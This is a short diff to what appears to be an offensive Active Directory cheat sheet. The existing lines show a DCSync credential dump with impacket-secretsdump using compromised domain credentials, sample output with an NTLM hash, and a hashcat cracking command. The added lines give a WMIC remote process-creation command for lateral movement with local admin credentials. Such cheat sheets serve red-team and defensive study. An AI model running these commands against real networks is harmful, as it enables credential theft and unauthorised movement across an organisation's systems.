@@ -627,3 +627,11 @@ hashcat -m 1000 dcsync.hash /home/user/tools/wordlists/rockyou.txt -r /home/user
 impacket-secretsdump -just-dc-user target-username testad.local/compromiseduser:"compromised-user-password\!"@192.168.23.45
 #Impacket output should look something like the following, where the last part is the NTML-hash of the user. Impacket leverages DRSUAPI:
 target-username:1025:bad1d471e70812ebcaa1e913e80401da:12e3d45c6b7a89b01b2cde3456789012:::
+
+----
+
+##Lateral movement
+#Spawning a process (calc) on other host if you have LA credentials with now deprecated WMIC, to which UAC does not apply:
+wmic /node:192.168.23.45 /user:username /password:password1! process call create "calc"
+#This should return the PID and return value 0, indicating a succesful process creation
+
